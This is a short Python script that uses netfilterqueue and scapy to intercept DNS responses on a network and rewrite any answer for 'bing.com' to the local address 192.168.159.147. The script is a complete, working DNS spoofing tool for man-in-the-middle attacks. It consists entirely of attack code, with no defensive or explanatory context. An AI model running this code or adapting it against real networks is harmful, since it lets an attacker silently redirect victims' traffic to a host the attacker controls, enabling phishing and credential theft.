import netfilterqueue
import scapy.all as scapy

def modify_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname.decode()
        if "bing.com" in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname,rdata="192.168.159.147")
            # Modifying the Scapy_packet
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            # Preventing from packet corruption
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            # Making changes in the actual packet
            packet.set_payload(bytes(scapy_packet))
    packet.accept()
queue = netfilterqueue.NetfilterQueue()
queue.bind(0,modify_packet)
queue.run()
    